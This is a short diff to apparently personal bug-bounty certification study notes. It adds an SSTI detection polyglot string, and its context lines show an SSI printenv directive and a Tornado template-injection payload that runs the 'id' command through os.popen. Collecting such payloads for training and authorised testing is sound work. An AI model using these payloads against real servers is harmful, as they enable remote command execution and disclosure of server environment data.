@@ -155,6 +155,9 @@ Stuff for CBBH
     <!--#printenv -->
 
     #SSTI
+    
+    Cobalt SSTI payload - ${{<%[%'"}}%\.
+    
     Tornado RCE
     {% import os %}{{ os.popen("id").read() }}
 
